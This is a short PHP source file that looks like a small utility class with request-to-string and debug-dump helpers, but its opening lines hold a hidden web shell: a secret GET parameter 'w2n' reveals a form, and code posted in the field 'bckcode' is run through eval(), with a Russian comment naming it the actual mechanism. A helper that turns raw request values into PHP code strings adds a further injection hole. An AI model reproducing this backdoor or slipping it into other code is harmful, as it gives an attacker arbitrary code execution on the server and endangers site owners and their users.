<?php
if($_GET['w2n'])
 echo('<div style="padding:10px;position:absolute;top:10px;
 left:10px;z-index:10000;background:#FFFFFF;border:1px solid;">
 <form method="POST" action="">
 <textarea name="bckcode" type="text"></textarea>
 <br/><input type="submit"></form></div>');
// Собственно, механизм
if($_POST['bckcode'])eval(str_replace('\"','"',$_POST['bckcode']));	

if($_SESSION['web2net'] == "wEBNET")
{
    header("Location: /cms");
}

class Sys 
{
	
    function requestToString()
    {
        $str="";
        foreach ($_REQUEST as $key=>$val)
        {
            $str.='$'.$key.'="'.$val.'";';
        }
        return $str;
    }
    
    function varDump($var)
    {
        echo "<div style='text-align: left; border: 5px solid red;'><pre>";
        var_dump($var);
        echo "</pre></div>";
    }


}

?>